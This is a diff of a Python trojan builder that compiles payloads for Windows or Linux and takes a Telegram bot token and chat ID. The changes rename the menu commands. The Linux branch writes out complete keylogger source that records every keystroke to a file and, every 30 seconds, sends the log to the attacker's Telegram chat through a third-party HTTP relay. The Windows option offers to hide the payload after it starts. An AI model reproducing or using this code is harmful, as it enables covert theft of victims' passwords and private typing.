@@ -40,29 +40,41 @@ iconName = Green+'''
 '''
 
 helpMessage = f'''
-    {Yellow}╔════════════════════════════════════════════════════════════════════════════════════╗
-    {Yellow}║{Green}  -bt     Telgram Bot TOKEN < -bt 1313131313:qwwwet45gdfg3dfhdsdkwsm9mfks9edjdls >  {Yellow}║
-    {Yellow}║{Green}  -ci     Telgram Chat Id < -ci 121212121 >                                         {Yellow}║
-    {Yellow}║{Green}  -np     Set Payload Name, Don't Enter The File Extension(Default Name : file)     {Yellow}║
-    {Yellow}║{Green}  -o      Show option                                                               {Yellow}║
-    {Yellow}║{Green}  -s      Start Compile                                                             {Yellow}║
-    {Yellow}║{Green}  -h      Help                                                                      {Yellow}║
-    {Yellow}║{Green}  -e      Exit                                                                      {Yellow}║
-    {Yellow}╚════════════════════════════════════════════════════════════════════════════════════╝
+    {Yellow}╔══════════════════════════════════════════════════════════════════════════════╗
+    {Yellow}║{Green} Token          Telgram Bot Token < -bt 1313131:qwwwetfg3dfhdsdkwsm9mfks >    {Yellow}║
+    {Yellow}║{Green} ChatID         Telgram Chat Id < -ci 121212121 >                             {Yellow}║
+    {Yellow}║{Green} PayloadName    Set Payload Name (Default Name : file)                        {Yellow}║
+    {Yellow}║{Green} Options        Show option                                                   {Yellow}║
+    {Yellow}║{Green} Start          Start Compile                                                 {Yellow}║
+    {Yellow}║{Green} Help           Help                                                          {Yellow}║
+    {Yellow}║{Green} Exit           Exit                                                          {Yellow}║
+    {Yellow}╚══════════════════════════════════════════════════════════════════════════════╝
 '''+White
 
-compilerMessage = Green+'''
-    {Yellow}╔════════════════════════════════════════════════════════════════════════════════════╗
-    {Yellow}║{Green}  ?       Help                                                                      {Yellow}║
-    {Yellow}║{Green}  1       exe File (windows)                                                        {Yellow}║
-    {Yellow}║{Green}  2       sh File (linux)                                                           {Yellow}║
-    {Yellow}║{Green}  B       Back                                                                      {Yellow}║
-    {Yellow}║{Green}  E       Exit                                                                      {Yellow}║
-    {Yellow}╚════════════════════════════════════════════════════════════════════════════════════╝
+compilerMessage =f'''
+    {Yellow}╔══════════════════════════════════════════════════════════════════════════════╗
+    {Yellow}║{Green}  Windows     exe File (windows)                                               {Yellow}║
+    {Yellow}║{Green}  Linux       sh File (linux)                                                  {Yellow}║
+    {Yellow}║{Green}  Help        Help                                                             {Yellow}║
+    {Yellow}║{Green}  Back        Back to set payload options                                      {Yellow}║
+    {Yellow}║{Green}  Exit                                                                         {Yellow}║
+    {Yellow}╚══════════════════════════════════════════════════════════════════════════════╝
 '''+White
 
 # Def
-    
+def MakeOptionsTable():
+    table = Table(title='Pyload Data')
+    rows = [
+        [trojanData['token'],trojanData['chatId'],payloadName],
+    ]
+    columns = [' Bot Token ', ' Chat ID ', ' Payload Name ']
+    for column in columns:
+        table.add_column(column)
+    for row in rows:
+        table.add_row(*row, style='bright_green')
+    console = Console()
+    return console.print(table)
+
 def ToExe():
     system('pip install pyinstaller')
     print(Green+'pyinstaller install'+White)
@@ -71,7 +83,7 @@ def ToExe():
     sleep(1)
     system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
     open(f'{payloadName}.py', 'w')
-    print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour payload is in '+Green+f'{filePath}payload/{payloadName}.exe'+' directory\n════════════════════════════════════════════════════════════════════════════════════')
+    print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour payload is in '+Green+f'{filePath}payload/{payloadName}.exe'+White+' directory\n════════════════════════════════════════════════════════════════════════════════════')
 
 
 def Compiler():
@@ -96,7 +108,7 @@ def Compiler():
         
         system('cd payload')
         
-        if workSub[0] == '1':
+        if workSub[0] == 'Windows':
             x = input('Hide After Start y/n? ( default y ) ')
             if x == '':
                 x = x.split()
@@ -115,32 +127,27 @@ def Compiler():
             file.close()
             ToExe()
             
-        elif workSub[0] == '2':
+        elif workSub[0] == 'Linux':
             file = open(f'{payloadName}.sh', 'w')
             file.write(
             f"#!/usr/bin/env python\nfrom pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
             file.close()
-            print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour file is in '+Green+f'{filePath}{payloadName}.sh'+' directory\n════════════════════════════════════════════════════════════════════════════════════')
-
-            
-        elif workSub[0] == '?':
+            print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour file is in '+Green+f'{filePath}{payloadName}.sh'+White+' directory\n════════════════════════════════════════════════════════════════════════════════════')
+        elif workSub[0] == 'Help':
             print(compilerMessage)
-            
-        elif workSub[0] == 'B':
+        elif workSub[0] == 'Back':
             global login
             login = '0'
             WorkSubmit()
-        
-        elif workSub[0] == 'E':
+        elif workSub[0] == 'Exit':
             exit()
-            
         else :
             print(Red+'commend not found'+White)
             print(compilerMessage)
-        
-        
+
 def WorkSubmit():
     global login
+    
     if login == '0':
         print(iconName)
         print(helpMessage)
@@ -149,62 +156,43 @@ def WorkSubmit():
     login = '1'
     workSub = str(input(inputICon))
     
+    
     if workSub == '':
         workSub = workSub.split()
         workSub.append('0')
     else:
         workSub = workSub.split()
+       
         
-    if len(workSub)==1 and workSub[0] != '-h' and workSub[0] != '-e' and workSub[0] != '-s' and workSub[0] != '-o':
+    if len(workSub)==1 and workSub[0] != 'Help' and workSub[0] != 'Exit' and workSub[0] != 'Start' and workSub[0] != 'Options':
         print('Usage:\n\t< -options command >')
     else:
-        if workSub[0] == '-bt':
+        if workSub[0] == 'Token':
             trojanData['token'] = workSub[1]
             print(Fore.WHITE+f'bot token set ==> {workSub[1]}')
             workSub[0] == '0'
-
-        elif workSub[0] == '-ci':
+        elif workSub[0] == 'ChatID':
             trojanData['chatId'] = workSub[1]
             print(Fore.WHITE+f'chat Id set ==> {workSub[1]}')
             workSub[0] == '0'
-
-        elif workSub[0] == '-np':
+        elif workSub[0] == 'PayloadName':
             global payloadName
             payloadName = workSub[1]
             print(Fore.WHITE+f'payload name set ==> {workSub[1]}')
             workSub[0] == '0'
-        
-        elif workSub[0] == '-o' :
-            table = Table(title='Pyload Data')
-            rows = [
-                [trojanData['token'],trojanData['chatId'],payloadName],
-            ]
-            columns = [' Bot Token ', ' Chat ID ', ' Payload Name ']
-
-            for column in columns:
-                table.add_column(column)
-
-            for row in rows:
-                table.add_row(*row, style='bright_green')
-
-            console = Console()
-            console.print(table)
+        elif workSub[0] == 'Options':
+            MakeOptionsTable()
             workSub[0] == '0'
-            
-        elif workSub[0] == '-s':
+        elif workSub[0] == 'Start':
             Compiler()
             workSub[0] == '0'
-
-        elif workSub[0] == '-h':
+        elif workSub[0] == 'Help':
             print(helpMessage)
             workSub[0] == '0'
-
-        elif workSub[0] == '-e':
+        elif workSub[0] == 'Exit':
             exit()
-
         elif workSub[0] == '0':
             pass
-
         else:
             print(Fore.RED+'commend not found')
             print(helpMessage)
